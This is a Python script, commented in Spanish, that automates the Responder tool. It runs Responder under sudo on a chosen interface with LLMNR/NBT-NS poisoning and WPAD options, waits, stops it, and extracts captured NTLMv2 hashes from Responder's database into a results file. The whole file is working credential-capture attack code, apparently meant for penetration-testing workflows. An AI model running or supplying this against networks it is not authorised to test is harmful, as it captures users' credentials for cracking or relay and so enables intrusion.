import subprocess
import os
import time
import sqlite3
import signal

def run_responder(interface, wait_time=60, output_path="results/hashes.txt"):
    """
    Ejecuta Responder en la interfaz especificada, espera X tiempo y extrae hashes capturados.
    Guarda los hashes NTLMv2 en output_path.
    """

    responder_log = "results/responder.log"
    responder_db = "/usr/share/responder/Responder.db"

    responder_cmd = [
        "sudo", "responder", "-I", interface, "-wrf", "-F", "-v"
    ]

    print(f"[*] Ejecutando Responder en la interfaz {interface}...")

    # Limpiar base de datos Responder (opcional, para evitar registros antiguos)
    responder_db = "/usr/share/responder/Responder.db"

    if os.path.exists(responder_db):
        try:
            import sqlite3
            conn = sqlite3.connect(responder_db)
            cursor = conn.cursor()
            cursor.execute("DELETE FROM responder;")
            conn.commit()
            conn.close()
            print("[*] Responder.db limpiada antes de iniciar.")
        except Exception as e:
            print(f"[!] No se pudo limpiar Responder.db: {e}")

    with open(responder_log, "w") as log_file:
        try:

            responder_proc = subprocess.Popen(responder_cmd, stdout=log_file, stderr=log_file)
            print(f"[+] Responder ejecutándose (PID: {responder_proc.pid})")
        except Exception as e:
            print(f"[!] Error al lanzar Responder: {e}")
            return False

    print(f"[*] Esperando {wait_time} segundos para captura de hashes...")
    time.sleep(wait_time)

    # Parar Responder de forma segura
    print("[*] Deteniendo Responder...")
    try:
        responder_proc.send_signal(signal.SIGINT)
        responder_proc.wait()
    except Exception as e:
        print(f"[!] Error al detener Responder: {e}")

    # Verificar existencia del archivo DB
    if not os.path.exists(responder_db):
        print("[-] No se encontró la base de datos de Responder.")
        return False

    # Extraer hashes de la base de datos
    hashes = []
    try:
        conn = sqlite3.connect(responder_db)
        cursor = conn.cursor()
        cursor.execute("SELECT FullHash FROM responder WHERE Type='NTLMv2-SSP';")
        rows = cursor.fetchall()
        for row in rows:
            hashes.append(row[0])
        conn.close()
    except Exception as e:
        print(f"[!] Error al leer Responder.db: {e}")
        return False

    if not hashes:
        print("[-] No se capturaron hashes NTLMv2.")
        return False

    # Guardar en archivo output
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "w") as f:
        for hash_line in hashes:
            f.write(hash_line + "\n")

    print(f"[+] {len(hashes)} hash(es) NTLMv2 guardado(s) en {output_path}")
    return True
